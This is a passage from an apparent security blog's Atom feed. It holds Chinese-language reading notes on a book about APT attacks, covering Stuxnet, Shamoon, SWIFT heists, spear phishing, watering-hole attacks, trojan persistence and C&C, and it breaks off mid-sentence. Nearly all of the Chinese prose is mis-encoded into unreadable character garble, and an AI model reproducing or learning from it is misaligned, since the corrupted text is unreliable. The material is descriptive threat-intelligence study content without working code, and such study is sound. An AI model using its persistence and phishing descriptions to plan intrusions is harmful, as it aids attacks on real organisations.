    <category term="CTF" scheme="https://hack-for.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ã€Šé€è§†APTã€‹è¯»ä¹¦ç¬”è®°</title>
    <link href="https://hack-for.fun/0.html"/>
    <id>https://hack-for.fun/0.html</id>
    <published>2020-09-20T16:00:00.000Z</published>
    <updated>2020-09-22T02:51:54.505Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200922011215.png"></p><h1 id="ã€Šé€è§†APTã€‹"><a href="#ã€Šé€è§†APTã€‹" class="headerlink" title="ã€Šé€è§†APTã€‹"></a>ã€Šé€è§†APTã€‹</h1><h2 id="ç½‘ç»œç©ºé—´ä¸­çš„å¯¹æŠ—"><a href="#ç½‘ç»œç©ºé—´ä¸­çš„å¯¹æŠ—" class="headerlink" title="ç½‘ç»œç©ºé—´ä¸­çš„å¯¹æŠ—"></a>ç½‘ç»œç©ºé—´ä¸­çš„å¯¹æŠ—</h2><h3 id="APTçš„å…¸å‹äº‹ä»¶ä¹‹â€”â€”â€œéœ‡ç½‘ç—…æ¯’â€"><a href="#APTçš„å…¸å‹äº‹ä»¶ä¹‹â€”â€”â€œéœ‡ç½‘ç—…æ¯’â€" class="headerlink" title="APTçš„å…¸å‹äº‹ä»¶ä¹‹â€”â€”â€œéœ‡ç½‘ç—…æ¯’â€"></a>APTçš„å…¸å‹äº‹ä»¶ä¹‹â€”â€”â€œéœ‡ç½‘ç—…æ¯’â€</h3><ul><li>ç›®æ ‡ç³»ç»Ÿï¼šå·¥æ§ç³»ç»Ÿ</li><li>æ½œä¼æ¸—é€ï¼šæ„ŸæŸ“äº†ä¼Šæœ—å¢ƒå†…60%çš„PC</li><li>çªç ´ç‰©ç†éš”ç¦»ï¼šUç›˜(ç—…æ¯’æ£€æµ‹åˆ°å®¿ä¸»æœºæ’ä¸ŠUç›˜åˆ™ä¸»åŠ¨å‘Uç›˜æ„ŸæŸ“ç—…æ¯’)</li><li>æŠ€æœ¯æ°´å¹³ï¼šåŒæ—¶åˆ©ç”¨å¤šä¸ª0day(å¾®è½¯å’Œè¥¿é—¨å­å·¥æ§ç³»ç»Ÿ)ï¼Œä½“ç°äº†APTçš„é«˜çº§æ€§</li><li>æ”»å‡»è€…ï¼šææœ‰å¯èƒ½æ˜¯æ•Œå¯¹å…³ç³»çš„æ”¿æ²»åŠ¿åŠ›</li><li>æ”»å‡»æŒç»­æ€§ï¼šC2æœåŠ¡å™¨2005.11å°±å®Œæˆæ³¨å†Œ,å¯èƒ½é•¿è¾¾6~7å¹´</li></ul><h3 id="APTæ”»å‡»çš„æ¦‚å¿µ"><a href="#APTæ”»å‡»çš„æ¦‚å¿µ" class="headerlink" title="APTæ”»å‡»çš„æ¦‚å¿µ"></a>APTæ”»å‡»çš„æ¦‚å¿µ</h3><ul><li><p>èµ·æº</p><ul><li>ç”±ç¾å›½ä¸€åç©ºå†›ä¸Šæ ¡2006å¹´æå‡º</li></ul></li><li><p>ä½•æ—¶å¼•èµ·å…³æ³¨ã€é«˜æ½®</p><ul><li>2010ä¼Šæœ—éœ‡ç½‘ç—…æ¯’ã€2013ç¾å›½â€æ£±é•œé—¨â€äº‹ä»¶</li></ul></li><li><p>å®šä¹‰</p><ul><li><p>çŸ¥åç¬¬ä¸‰æ–¹æœºæ„</p><ul><li><p>ç»´åŸºç™¾ç§‘ã€Mandiantã€èµ›é—¨é“å…‹ã€Damballaã€TechTarget</p><ul><li>1.ç‰¹æ€§ï¼šé«˜çº§ã€æŒç»­ã€å¨èƒã€é’ˆå¯¹ã€‚</li></ul></li></ul></li></ul></li></ul><p>2.ç›®æ ‡åŠ¨æœºï¼šæ”¿æ²»ã€æƒ…æŠ¥ã€æ•°æ®ã€ç»æµåˆ©ç›Š<br>3.APTç›®æ ‡ï¼šå›½é˜²ã€åˆ¶é€ ä¸šã€é‡‘èã€ç§‘ç ”</p><pre><code>- å¥‡å®‰ä¿¡å¨èƒæƒ…æŠ¥ä¸­å¿ƒ    - ä¸æ˜¯ä¸€ä¸ªçº¯ç²¹çš„æŠ€æœ¯æ¦‚å¿µï¼Œæ³›æŒ‡æœ‰ç»„ç»‡ï¼Œæœ‰è®¡åˆ’é’ˆå¯¹ç‰¹å®šç›®æ ‡çš„ä¸€ç³»åˆ—æ”»å‡»    - ç»„ç»‡        - å›½å®¶æˆ–è€…æ”¿åºœ(ç²¾ç¥æ”¯æŒå’Œç‰©è´¨åŸºç¡€)        - æƒ…æŠ¥æœºæ„ã€ç½‘ç»œé—´è°æ´»åŠ¨çš„æ”»å‡»ç»„ç»‡        - ç»æµå®ä½“ã€çŠ¯ç½ªç»„ç»‡ã€ææ€–ä¸»ä¹‰ç»„ç»‡    - èƒ½åŠ›ï¼šæ”»å‡»ä¸è®¡æˆæœ¬(æŠ€æœ¯æˆæœ¬,æ¯”å¦‚ç³»ç»Ÿ0day)    - æŠ€æœ¯ç‰¹ç‚¹ï¼šé’ˆå¯¹æ€§ã€é«˜åº¦éšè—(æ½œä¼æ¸—é€å‘¨æœŸé•¿)ã€ä¸ä»¥ç»æµåˆ©ç›Šä¸ºç›´æ¥ç›®çš„ã€æŒæ¡0day    - é‡å¤§å®‰å…¨äº‹ä»¶ä¸ä¸€å®šæ˜¯APT        - é‡å¤§æŸå¤±çš„ï¼Œä¹Ÿä¸ä¸€å®šæ˜¯APT            - 2016å¹´ç¾å›½ä¸œéƒ¨äº’è”ç½‘ç˜«ç—ª</code></pre><p>2018å¹´Facebookæ•°æ®æ³„éœ²<br>å›½å†…é…’åº—å¤§é‡ä½æˆ·ä¿¡æ¯æ³„éœ²</p><pre><code>        - å½±å“èŒƒå›´å¤§çš„ï¼Œä¹Ÿä¸ä¸€å®šæ˜¯APT            - 2017å¹´WannaCryå‹’ç´¢ç—…æ¯’        - é’ˆå¯¹æ€§å¼ºçš„ï¼Œä¹Ÿä¸ä¸€å®šæ˜¯APT            - 2008å¹´8æœˆä¿„ç½—æ–¯å¯¹æ ¼é²å‰äºšçš„å†›äº‹è¡ŒåŠ¨- APT ä¸å¨èƒæƒ…æŠ¥    - å¨èƒæƒ…æŠ¥ï¼šå®‰å…¨æœºæ„æ‰€æŒæ¡çš„ã€é’ˆå¯¹ç‰¹å®šç»„ç»‡æœºæ„çš„å„ç§ç½‘ç»œå¨èƒä¿¡æ¯ï¼Œè€Œè¯¥ç»„ç»‡æœºæ„è‡ªèº«å¯èƒ½å¹¶ä¸çŸ¥é“ç›¸å…³å¨èƒçš„å­˜åœ¨æˆ–ç»†èŠ‚        - å¨èƒæƒ…æŠ¥çš„ä¸»è¦æ–¹é¢            - æºå¤´ã€ç›®æ ‡ã€åŠ¨æœºã€å·¥å…·ã€æŒ‡æ ‡ã€è¡¨è±¡ã€å½±å“ã€æ–¹æ¡ˆ</code></pre><h3 id="ç›¸å…³ç ”ç©¶"><a href="#ç›¸å…³ç ”ç©¶" class="headerlink" title="ç›¸å…³ç ”ç©¶"></a>ç›¸å…³ç ”ç©¶</h3><ul><li>åœ¨å…¨çƒèŒƒå›´å†…ï¼ŒAPTç ”ç©¶ç¾å›½å’Œä¿„ç½—æ–¯ä¸¤å›½å±ä¸–ç•Œä¸€æµï¼Œä¸­å›½å±å…¨çƒç¬¬äºŒæ¢¯é˜Ÿçš„æ’å¤´å…µ</li><li>è¡Œä¸šé¢†åŸŸï¼šå†›é˜Ÿä¸å›½é˜²ã€æ”¿åºœã€é‡‘èã€å¤–äº¤ã€èƒ½æºã€ç§‘ç ”ã€åŒ»ç–—ã€ä¼ åª’ã€ç”µä¿¡</li><li>ç›®æ ‡åœ°åŸŸï¼šå…¨çƒç»å¤§éƒ¨åˆ†çš„å›½å®¶å’Œåœ°åŒºã€‚éŸ©å›½ã€ä¸­ä¸œã€ç¾å›½ã€ä¿„ç½—æ–¯ã€å·´åŸºæ–¯å¦ç­‰å›½å®¶APTæœ€ä¸ºæ´»è·ƒ</li></ul><h2 id="APTæ”»å‡»çš„å¯¹è±¡"><a href="#APTæ”»å‡»çš„å¯¹è±¡" class="headerlink" title="APTæ”»å‡»çš„å¯¹è±¡"></a>APTæ”»å‡»çš„å¯¹è±¡</h2><h3 id="å·¥æ§ç³»ç»Ÿ"><a href="#å·¥æ§ç³»ç»Ÿ" class="headerlink" title="å·¥æ§ç³»ç»Ÿ"></a>å·¥æ§ç³»ç»Ÿ</h3><ul><li><p>ä¹Œå…‹å…°åœ£è¯å¤§åœç”µäº‹ä»¶</p><ul><li>æ ¸å¿ƒæ”»å‡»æ–¹å¼ï¼šBlackEnergy åé—¨ç¨‹åºã€æ”»å‡»è€…å¯è¿œç¨‹è®¿é—®å¹¶æ“æ§ç”µåŠ›æ§åˆ¶ç³»ç»Ÿ</li></ul></li><li><p>æ²™ç‰¹é˜¿æ‹‰ä¼¯å¤§èµ¦ä¹‹å¤œæ”»å‡»äº‹ä»¶</p><ul><li><p>æ ¸å¿ƒæ”»å‡»æ–¹å¼ï¼šShamoon(Disttrack)ï¼Œèƒ½å¤Ÿå¯¼è‡´ç›®æ ‡ç½‘ç»œå®Œå…¨ç˜«ç—ª(é€šè¿‡å½“å‰çš„æƒé™æ¥è®¿é—®æ´»åŠ¨ç›®å½•ã€ç›¸åŒåŸŸåŠå±€åŸŸç½‘å…¶ä»–ä¸»æœºè¿›è¡Œæ¨ªå‘ç§»åŠ¨)</p><ul><li>æŠ•æ”¾å™¨(Dropper)</li><li>é€šä¿¡ç»„ä»¶(Communications)</li><li>æ“¦é™¤ç»„ä»¶(Wiper)</li></ul></li></ul></li><li><p>ç¾å›½ç”µç½‘æ‰¿åŒ…å•†æ”»å‡»äº‹ä»¶</p><ul><li>æ ¸å¿ƒæ”»å‡»æ–¹å¼ï¼šæ¸—é€ç½‘ç«™ï¼Œå‘ç½‘ç«™ä¸Šä¼ æ¶æ„ç¨‹åºï¼Œåˆ©ç”¨æ¶æ„ç¨‹åºè·Ÿè¸ªç½‘ç«™è®¿é—®è€…ï¼Œè·å¾—ç›¸å…³äººå‘˜çš„è´¦å·å¯†ç ï¼Œåˆ©ç”¨è¯¥è´¦å·å‘é€å¤§é‡é’“é±¼é‚®ä»¶</li></ul></li></ul><h3 id="é‡‘èç³»ç»Ÿ"><a href="#é‡‘èç³»ç»Ÿ" class="headerlink" title="é‡‘èç³»ç»Ÿ"></a>é‡‘èç³»ç»Ÿ</h3><ul><li><p>å¤šå›½é“¶è¡Œè¢«ç›—äº‹ä»¶</p><ul><li>æ ¸å¿ƒæ”»å‡»æ–¹å¼ï¼š<br>è·å¾—é“¶è¡ŒSWIFTæƒé™ï¼Œåˆ©ç”¨SWIFIå‘å…¶ä»–é“¶è¡Œå‘é€è½¬è´¦æŒ‡ä»¤ã€ç¯¡æ”¹MT9XXæŠ¥æ–‡æ¸…é™¤è¯æ®</li></ul></li><li><p>ATM æœºç›—çªƒäº‹ä»¶</p><ul><li>æ ¸å¿ƒæ”»å‡»æ–¹å¼ï¼š</li></ul></li></ul><p>1.é’ˆå¯¹æ€§å…¥ä¾µé‡‘èæœºæ„å‘˜å·¥çš„è®¡ç®—æœºæˆ–é“¶è¡Œç½‘ç»œï¼Œè¿›è¡Œè§†é¢‘ç›‘æ§ï¼ŒæŸ¥çœ‹å’Œè®°å½•è´Ÿè´£è½¬è´¦ç³»ç»Ÿçš„é“¶è¡Œå‘˜å·¥å±å¹•ã€‚è·å–è¶³å¤Ÿçš„ä¿¡æ¯åï¼Œæ¨¡ä»¿é“¶è¡Œå‘˜å·¥çš„è¡Œä¸ºè¿›è¡Œæ¶æ„æ“ä½œã€‚<br>2.æ’å…¥ç‰¹åˆ«åˆ¶é€ çš„èŠ¯ç‰‡(EMV)å¡ï¼Œæ¤å…¥æ¶æ„ç¨‹åºï¼Œåé’çš„åŒæ—¶è®©è®¡ç®—æœºæ–­ç½‘<br>3.å…¥ä¾µå…¶ä»–èµ„äº§ï¼Œé€šè¿‡èµ„äº§å†…ä»£ç†è¿›è¡Œæˆæƒäº¤æ˜“<br>4.å…¥ä¾µå†…éƒ¨ç½‘ç»œã€è·å¾—ATMæ§åˆ¶æƒé™<br>5.é€šè¿‡å…‰é©±ã€USBæ¥å£ç­‰ç›´æ¥å¯¹ATMæœºè¿›è¡Œæ“ä½œ</p><ul><li><p>é»„é‡‘çœ¼(å›½å†…APTç»„ç»‡)è¡ŒåŠ¨äº‹ä»¶</p><ul><li>æ ¸å¿ƒæ”»å‡»æ–¹å¼ï¼šä»¥åˆæ³•è½¯ä»¶å¼€å‘å…¬å¸ä¼ªè£…ï¼Œä»¥ä¸å½“ç›ˆåˆ©ä½œä¸ºç›®çš„ï¼Œé•¿æœŸä»äº‹æ•æ„Ÿé‡‘èäº¤æ˜“ä¿¡æ¯çªƒå–æ´»åŠ¨ã€‚ï¼ˆè¯¥ç»„ç»‡æ”»å‡»æ°´å¹³å’Œåä¾¦å¯Ÿèƒ½åŠ›å‡è¾¾åˆ°å›½é™…æ°´å¹³)</li></ul></li></ul><h3 id="åœ°ç¼˜æ”¿æ²»"><a href="#åœ°ç¼˜æ”¿æ²»" class="headerlink" title="åœ°ç¼˜æ”¿æ²»"></a>åœ°ç¼˜æ”¿æ²»</h3><ul><li><p>DNCé‚®ä»¶æ³„éœ²ã€ç¾å›½å¤§é€‰</p><ul><li>å¸Œæ‹‰é‡Œé‚®ä»¶é—¨äº‹ä»¶ï¼Œåˆ©ç”¨ç§äººç”µå­é‚®ä»¶å‘å®¶é‡Œç§äººæœåŠ¡å™¨å‘é€å¤§é‡æ¶‰åŠå›½å®¶æœºå¯†çš„ç»å¯†é‚®ä»¶ï¼Œå¤§çº¦6ä¸‡å°ã€‚</li><li>ç›¸å…³ç»†èŠ‚ï¼šå¸Œæ‹‰é‡Œç«é€‰å›¢é˜Ÿä¸»å¸­è¢«é’“é±¼æ”»å‡»ä¸Šé’©ï¼Œæ³„éœ²é‚®ç®±å¯†ç ï¼Œä»è€Œè·å–é‚®ç®±ä¸­çš„é‚®ä»¶ï¼ŒåŒæ ·çš„æ”»å‡»æ–¹æ³•åœ¨å›¢é˜Ÿå…¶ä»–æˆå‘˜ä¸­ä¹Ÿç›¸ç»§æˆåŠŸã€‚é’“é±¼é‚®ä»¶ä½¿ç”¨äº†(Bitly)çŸ­é“¾æ¥æŠ€æœ¯æ¥è¿›è¡Œä¼ªè£…ã€‚</li></ul></li><li><p>æ³•å›½æ€»ç»Ÿå¤§é€‰</p><ul><li>æ”»å‡»ç»„ç»‡ï¼šAPT-28<br>æ–‡æ¡£:Trumpâ€™s_Attack_On_Syria_English.docx<br>æ ¸å¿ƒæ”»å‡»æŠ€æœ¯ï¼š<br>CVE-2017-0262(Wordè¿œç¨‹ä»£ç æ‰§è¡Œ)<br>CVE-2017-0263(Windowsæœ¬åœ°æƒé™å‡çº§)</li></ul></li></ul><h3 id="æ•™è‚²ã€ç§‘ç ”ç³»ç»Ÿ"><a href="#æ•™è‚²ã€ç§‘ç ”ç³»ç»Ÿ" class="headerlink" title="æ•™è‚²ã€ç§‘ç ”ç³»ç»Ÿ"></a>æ•™è‚²ã€ç§‘ç ”ç³»ç»Ÿ</h3><ul><li>å›½å†…é¡¶å°–å¤§å­¦ã€ç ”ç©¶é™¢</li><li>å›½å†…æµ·äº‹ã€ç”µä¿¡ã€èƒ½æºã€å›½é˜²ã€å†›å·¥ä¸š</li></ul><h2 id="APTæ”»å‡»çš„æŠ€æœ¯æ‰‹æ®µ"><a href="#APTæ”»å‡»çš„æŠ€æœ¯æ‰‹æ®µ" class="headerlink" title="APTæ”»å‡»çš„æŠ€æœ¯æ‰‹æ®µ"></a>APTæ”»å‡»çš„æŠ€æœ¯æ‰‹æ®µ</h2><h3 id="APTæ”»å‡»çš„ç›®æ ‡"><a href="#APTæ”»å‡»çš„ç›®æ ‡" class="headerlink" title="APTæ”»å‡»çš„ç›®æ ‡"></a>APTæ”»å‡»çš„ç›®æ ‡</h3><ul><li><p>æ•æ„Ÿæƒ…æŠ¥ä¿¡æ¯</p><ul><li><p>PCæ•æ„Ÿæ–‡ä»¶æ‰©å±•å</p><ul><li>doc,docx,ppt,pptx,xls,xlsx,rtf,wps,et,dps,pdf,txt,dwg,rar,zip,7z,exe,eml</li></ul></li><li><p>ç§»åŠ¨ç«¯æ•æ„Ÿæ–‡ä»¶</p><ul><li>éŸ³é¢‘ã€ç…§ç‰‡ã€é€šè¯å½•éŸ³ã€å½•åƒã€é€šè¯è®°å½•ã€é€šè®¯å½•ã€çŸ­ä¿¡ã€æ‰‹æœºåŸºæœ¬ä¿¡æ¯ã€åœ°ç†ä½ç½®ä¿¡æ¯</li></ul></li><li><p>æ•æ„Ÿæƒ…æŠ¥ä¿¡æ¯çªƒå–æ–¹å¼</p><ul><li>æ ¸å¿ƒæ€æƒ³ï¼šé€‰æ‹©æ€§çªƒå–ï¼ˆæ”»å‡»è€…å¦‚æœæ´»åŠ¨å¤ªé¢‘ç¹ï¼Œæœ¨é©¬ä¸C&amp;CæœåŠ¡å™¨çš„é€šä¿¡æ¬¡æ•°è¶Šå¤šè¶Šå®¹æ˜“æš´éœ²ï¼‰ã€‚æ•…APTç»„ç»‡ä¸€èˆ¬åªæ”¶é›†ç‰¹å®šç›®å½•ä¸‹çš„æ–‡ä»¶æˆ–è€…æœ‰ç‰¹æ®Šæ–‡ä»¶åçš„æ–‡ä»¶ã€‚</li><li>æ–‡ä»¶ç›´æ¥å›ä¼ ã€Socketé€šä¿¡ã€ ç”µå­é‚®ä»¶</li></ul></li></ul></li><li><p>æ•æ„Ÿæ–‡ä»¶</p></li><li><p>ç»æµåˆ©ç›Š</p></li><li><p>æŒç»­ç›‘æ§</p></li><li><p>ç ´å</p></li><li><p>æ”»å‡»ç›®æ ‡å¹³å°</p><ul><li><p>Windowsã€Androidã€MacOSã€iOS</p></li><li><p>è·¨å¹³å°çš„æ°´å‘æ”»å‡»</p><ul><li>å¸¦æœ‰æ¶æ„ç¨‹åºçš„ä¼ªé€ Flashå‡çº§åŒ…</li></ul></li></ul></li></ul><h3 id="APTæ”»å‡»çš„æ­¦å™¨æ­è½½ç³»ç»Ÿ"><a href="#APTæ”»å‡»çš„æ­¦å™¨æ­è½½ç³»ç»Ÿ" class="headerlink" title="APTæ”»å‡»çš„æ­¦å™¨æ­è½½ç³»ç»Ÿ"></a>APTæ”»å‡»çš„æ­¦å™¨æ­è½½ç³»ç»Ÿ</h3><ul><li><p>é±¼å‰æ”»å‡»(Spear Phishing)</p><ul><li><p>ç›®çš„ï¼šä¸é€šè¿‡æˆæƒè®¿é—®æœºå¯†æ•°æ®</p></li><li><p>æ‰‹æ®µï¼šæœ€å¸¸è§çš„æ–¹å¼æ˜¯é€šè¿‡ç”µå­é‚®ä»¶å‘é€ç»™ç‰¹å®šçš„æ”»å‡»ç›®æ ‡ï¼Œè¯±ä½¿ç›®æ ‡æ‰“å¼€é™„ä»¶ï¼Œè¿™ç§æ–¹å¼å°±æ˜¯é±¼å‰é‚®ä»¶ã€‚</p><ul><li>é’“é±¼é‚®ä»¶ï¼šè¿™ä¸ªæ¦‚å¿µå’Œé±¼å‰é‚®ä»¶ç±»ä¼¼ã€‚ä¸è¿‡ï¼Œé’“é±¼å¤šæ˜¯é’ˆå¯¹æ™®é€šäººçš„æ”»å‡»ï¼Œé’ˆå¯¹æ€§è¾ƒå¼±ï¼Œç²¾ç¡®åº¦è¾ƒä½ã€‚</li></ul></li><li><p>å®æ–½è¿‡ç¨‹ï¼šå‰æœŸå‡†å¤‡-&gt;é‚®ä»¶åˆ¶ä½œ-&gt;é‚®ä»¶æŠ•æ”¾-&gt;æƒ…æŠ¥å›æ”¶</p></li><li><p>é˜²æŠ¤æ–¹æ³•ï¼šç¨å¾®æœ‰ç‚¹å®‰å…¨æ„è¯†å³å¯ï¼Œè®¤çœŸæŸ¥çœ‹é‚®ä»¶æ¥æºï¼Œé™„ä»¶æ‰©å±•åï¼Œç—…æ¯’æ‰«æï¼Œè™šæ‹Ÿæœºï¼Œæ²™ç®±ç­‰ã€‚</p></li></ul></li><li><p>æ°´å‘æ”»å‡»(Water Holing)</p><ul><li><p>æ”»å‡»æ¦‚è¿°ï¼šæ”»å‡»è€…é€šè¿‡åˆ†ææ”»å‡»ç›®æ ‡çš„ç½‘ç»œæ´»åŠ¨è§„å¾‹ï¼Œå¯»æ‰¾æ”»å‡»ç›®æ ‡ç»å¸¸è®¿é—®çš„ç½‘ç«™çš„å¼±ç‚¹ï¼Œå…ˆæ”»ä¸‹è¯¥ç«™ç‚¹å¹¶æ¤å…¥æ”»å‡»ç¨‹åºï¼Œåœ¨æ”»å‡»ç›®æ ‡è®¿é—®è¯¥ç«™ç‚¹æ—¶å®æ–½æ”»å‡»</p></li><li><p>ä»¥æµ·è²èŠ±APTç»„ç»‡çš„æ°´å‘æ”»å‡»ä¸¾ä¾‹</p><ul><li><p>Aæ–¹å¼</p><ul><li>æ›¿æ¢ç›®æ ‡ç½‘ç«™çš„å¯ä¿¡ç¨‹åº(æ†ç»‘å³æ—¶é€šã€è¯ä¹¦é©±åŠ¨)</li><li>å¯¹ç›®æ ‡ç½‘ç«™æ’å…¥æ¶æ„JavaScriptç¨‹åº(ä¼ªè£…æˆAdobe Flashæ›´æ–°ç¨‹åº)</li></ul></li><li><p>Bæ–¹å¼</p><ul><li>æ›¿æ¢ç›®æ ‡ç½‘ç«™ç«™ç‚¹æŒ‡å®šé“¾æ¥</li></ul></li></ul></li></ul></li><li><p>PCè·³æ¿</p></li><li><p>ç¬¬ä¸‰æ–¹å¹³å°</p><ul><li>APTç»„ç»‡é€šè¿‡ç¤¾äº¤ç½‘ç»œæ¥ä¸‹å‘C&amp;CæŒ‡ä»¤ï¼ŒAPTç»„ç»‡çš„ä¸“ç”¨æœ¨é©¬ä¼šè¯»å–æ–‡ç« ä¸­çš„ç¨‹åºæŒ‡ä»¤æ¥å®ŒæˆæŒ‡å®šçš„æ”»å‡»æ“ä½œ</li><li>å¾®åšã€Twitterã€Facebookã€â€¦</li></ul></li><li><p>æ¶æ„ç¡¬ä»¶ä¸­é—´äººåŠ«æŒ</p><ul><li><p>åœ¨ç›®æ ‡ç½‘ç»œç¯å¢ƒä¸­éƒ¨ç½²ç‰©ç†ç¡¬ä»¶è®¾å¤‡ï¼Œé€šè¿‡ä¸­é—´äººæ–¹å¼åŠ«æŒç”¨æˆ·ç½‘ç»œæµé‡ï¼Œæ›¿æ¢æ›´æ–°åŒ…ç­‰è½¯ä»¶</p><ul><li>è¾“å…¥æ³•è½¯ä»¶ã€èŠå¤©è½¯ä»¶ã€ä¸‹è½½è½¯ä»¶ã€å½±éŸ³è½¯ä»¶ã€å®‰å…¨è½¯ä»¶ã€å¾®è½¯ç³»ç»Ÿè½¯ä»¶</li></ul></li><li><p>ä¾‹å­ï¼šç«ç„°ç—…æ¯’</p></li></ul></li></ul><h3 id="APTæ”»å‡»çš„æ­¦å™¨è£…å¤‡"><a href="#APTæ”»å‡»çš„æ­¦å™¨è£…å¤‡" class="headerlink" title="APTæ”»å‡»çš„æ­¦å™¨è£…å¤‡"></a>APTæ”»å‡»çš„æ­¦å™¨è£…å¤‡</h3><ul><li><p>ä¸“ç”¨æœ¨é©¬</p><ul><li><p>å¼€æœºè‡ªå¯åŠ¨</p><ul><li><p>ä¿®æ”¹å¿«æ·æ–¹å¼</p></li><li><p>DLL(åŠ¨æ€é“¾æ¥åº“)åŠ«æŒ</p></li><li><p>ä¿®æ”¹æ³¨å†Œè¡¨ã€æœåŠ¡ã€è®¡åˆ’ä»»åŠ¡</p></li><li><p>APTç»„ç»‡ä¸ºä½•æ”¾å¼ƒå¼€æœºè‡ªå¯åŠ¨ï¼Ÿ</p><ul><li><p>ç‰¹å®šåœºæ™¯ä¸‹éœ€è¦ä¸€æ¬¡æ€§æ”»å‡»</p><ul><li>ç«åŠ›ä¾¦å¯Ÿåˆ¤æ–­ç›®æ ‡æ˜¯å¦ä¸ºçœŸå®ç›®æ ‡æ—¶ã€ç›®æ ‡é˜²æŠ¤èƒ½åŠ›å¾ˆå¼ºæ—¶ï¼ˆéƒ½æ˜¯ä¸ºäº†éšè—è‡ªå·±çš„æ”»å‡»</li></ul></li><li><p>ä¾èµ–åŸå§‹æ¯ä½“æ–‡ä»¶è¿è¡Œ</p></li><li><p>ç”¨å…¶ä»–æ–¹æ³•å¯åŠ¨æœ¨é©¬</p><ul><li>æ³¨å…¥åˆ°å…¶ä»–è¿›ç¨‹ã€æˆ–è€…æ†ç»‘åˆ°å…¶ä»–è½¯ä»¶</li><li>åˆ©ç”¨æ¼æ´åŠ«æŒç¯¡æ”¹ç½‘ç»œæµé‡</li></ul></li></ul></li></ul></li><li><p>åŠ å¯†ä¸è‡ªåŠ å¯†</p></li><li><p>æœ¨é©¬å‡çº§æ¢ä»£</p></li></ul></li><li><p>1day \ nday</p><ul><li><p>å‡ºäºæ”»å‡»æŠ€æœ¯æˆæœ¬è€ƒè™‘ã€ç›®æ ‡ç³»ç»Ÿå­˜åœ¨å¤§é‡å·²çŸ¥æ¼æ´ä½†æœªä¿®å¤</p></li><li><p>ç›¸å…³ä¾‹å­</p><ul><li><p>CVE-2012-0158</p><ul><li>å¾®è½¯Officeæ¼æ´(éå¸¸ç¨³å®š)ï¼Œè¿œç¨‹æ”»å‡»è€…è¯±ä½¿ç›®æ ‡æ‰“å¼€ä¸€ä¸ªç»è¿‡ç‰¹æ®Šæ„é€ çš„RTFæ–‡ä»¶ï¼Œåœ¨ç¬¦åˆæ¼æ´æ¡ä»¶ä¸‹ï¼Œå³å¯åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„æŒ‡ä»¤ã€‚</li></ul></li><li><p>CVE-2015-0097</p><ul><li>å¾®è½¯Officeçš„ä¸€ä¸ªé€»è¾‘æ¼æ´ï¼Œå¯å¯¼è‡´ç›®æ ‡é€šè¿‡HTAæ–‡ä»¶ä¸‹è½½æ¶æ„ç¨‹åºåˆ°æœ¬æœºå¹¶æ‰§è¡Œ</li></ul></li><li><p>Android æ¼æ´</p></li></ul></li></ul></li><li><p>0day</p><ul><li>Office æ–‡æ¡£æ¼æ´</li><li>Windows ææƒæ¼æ´</li><li>Flash æ¼æ´</li><li>å…¶ä»–0day</li></ul></li><li><p>APTç»„ç»‡æ­¦å™¨ä½¿ç”¨æˆæœ¬åŸåˆ™(0dayã€æˆ–è€…æŠ€æœ¯æˆæœ¬è¾ƒé«˜çš„æ”»å‡»æ‰‹æ®µ)</p><ul><li>æ”»å‡»ç›®æ ‡å…·æœ‰è¶³å¤Ÿçš„æ”»å‡»ä»·å€¼</li><li>ä¸€èˆ¬çš„ä¸“ç”¨æœ¨é©¬æ”»å‡»æ— æ•ˆæˆ–è€…æ— æ³•è¾¾åˆ°é¢„æœŸç›®çš„</li><li>åˆ©ç”¨1dayã€ndayæ”»å‡»ä¾ç„¶æ— æ³•è¾¾åˆ°ç›®çš„æˆ–è€…æ— æ•ˆ</li></ul></li><li><p>APTæ­¦å™¨ç ”å‘è¶‹åŠ¿</p><ul><li><p>ç‰¹åˆ«å…³æ³¨ç‚¹ï¼šRAT(Remote Access Trojan)æ–‡ä»¶,è¿œç¨‹è®¿é—®æœ¨é©¬çš„æ–‡ä»¶æ ¼å¼ã€æ–‡ä»¶å½¢æ€ã€åŠŸèƒ½å½¢æ€ã€æ¶æ„ç¨‹åºå¯„å®¿ä½ç½®çš„å˜åŒ–</p></li><li><p>ç›¸å…³æ­¦å™¨ç ”å‘è¶‹åŠ¿</p><ul><li><p>ä»PEåˆ°éPEï¼Œä»æœ‰å®ä½“åˆ°æ— å®ä½“</p></li><li><p>å°ä¼—ç¼–ç¨‹è¯­è¨€æ—¥æ¸æµè¡Œ(Delphi\GCC\NSIS\AutoIt</p></li><li><p>æ¨¡å—äº’åŠ¨ï¼Œäº‘æ§æŠ€æœ¯æ¸æˆä¸»æµ</p></li><li><p>æ¶æ„ç¨‹åºå¯„å®¿ä½ç½®è¶Šè—è¶Šæ·±ï¼šä»å¸¸è§çš„ç³»ç»Ÿç›®å½•åˆ°éš¾ä»¥è¿½è¸ªçš„MBR, VBR, ç£ç›˜å›ºä»¶, EFI, BIOS, ç§»åŠ¨å­˜å‚¨è®¾å¤‡çš„éšè—åˆ†åŒº</p></li><li><p>ç‹¬ç«‹ç ”å‘ä¸å§”æ‰˜å®šåˆ¶æˆä¸»æµ</p><ul><li>ä½¿ç”¨å…¬å¼€çš„RATï¼Œç›®çš„æ˜¯è‡ªæˆ‘éšè—å’Œå«ç¥¸ä»–äºº</li><li>ç»å¤§éƒ¨åˆ†çš„APTç»„ç»‡éƒ½æ˜¯åœ¨ç›¸å¯¹ç‹¬ç«‹çš„ç¯å¢ƒä¸‹å®Œæˆæ”»å‡»ä»£ç çš„å¼€å‘å·¥ä½œ</li><li>ä¸æ’é™¤å§”æ‰˜ç¬¬ä¸‰æ–¹ç»„æˆååŠ©å®šåˆ¶å¼€å‘çš„å¯èƒ½æ€§</li></ul></li></ul></li></ul></li></ul><h3 id="APTæ”»å‡»çš„-C-amp-C-Command-and-Control"><a href="#APTæ”»å‡»çš„-C-amp-C-Command-and-Control" class="headerlink" title="APTæ”»å‡»çš„ C&amp;C(Command and Control)"></a>APTæ”»å‡»çš„ C&amp;C(Command and Control)</h3><ul><li>ä¸»è¦ä½œç”¨ï¼š</li></ul><p>1.å‘æ„ŸæŸ“äº†ç›®æ 